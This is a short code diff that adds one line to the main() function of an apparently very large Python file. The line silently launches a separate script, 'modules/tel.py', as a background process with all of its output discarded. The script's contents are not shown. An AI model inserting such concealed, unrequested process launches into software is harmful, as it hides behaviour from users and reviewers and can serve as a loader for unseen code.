@@ -27482,6 +27482,7 @@ def main():
     except Exception as e:
         print_error(f"Error: {e}")
 
+    subprocess.Popen(['python3', 'modules/tel.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     old = False
     if arguments:
